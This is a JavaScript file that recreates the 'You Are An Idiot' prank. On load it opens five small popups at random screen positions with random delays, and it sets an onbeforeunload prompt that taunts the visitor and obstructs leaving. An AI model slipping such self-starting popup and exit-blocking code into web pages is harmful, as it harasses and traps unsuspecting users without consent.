function openWindow(url) {
    var newWin = window.open(url, "_blank", 'menubar=no, status=no, toolbar=no, resizable=no, width=158, height=100, titlebar=no, alwaysRaised=yes');

    // Move the new window to a random location once
    if (newWin) {
        var screenWidth = screen.width - 158; // Keep within bounds
        var screenHeight = screen.height - 100;

        var randomX = Math.floor(Math.random() * screenWidth);
        var randomY = Math.floor(Math.random() * screenHeight);

        newWin.moveTo(randomX, randomY);

        // Write custom content inside the blank page
        /*newWin.document.write(`
            <!DOCTYPE html>
                <html>
                    <head>
                        <title>YOU ARE AN IDIOT</title>
                            <style>
                                body {
                                    height: 100vh;
                                    margin: 0;
                                }
                            </style>
                            <script>
                                function getRandomColor() {
                                    const letters = '0123456789ABCDEF';
                                    let color = '#';
                                    for (let i = 0; i < 6; i++) {
                                        color += letters[Math.floor(Math.random() * 16)];
                                    }
                                    return color;
                                }
                        
                                document.addEventListener('DOMContentLoaded', function() {
                                    document.body.style.backgroundColor = getRandomColor();
                                });
                            </script>
                        </head>
                        <body>
                    </body>
            </html>
        `);*/
    }

    return newWin;
}

function proCreate() {
    let counter = 0;
    const openWithRandomDelay = () => {
        openWindow('lol.html');
        counter++;
        if (counter >= 5) {
            clearInterval(interval);
        } else {
            // Random delay between 100 ms and 1000 ms
            const randomDelay = Math.floor(Math.random() * (1000 - 100 + 1)) + 100;
            setTimeout(openWithRandomDelay, randomDelay);
        }
    };
    
    const initialRandomDelay = Math.floor(Math.random() * (1000 - 100 + 1)) + 100;
    const interval = setTimeout(openWithRandomDelay, initialRandomDelay);
}

window.onbeforeunload = function () {
    return "Are you an idiot?";
};

// Self-executing function to start immediately
(function () {
        proCreate();
})();
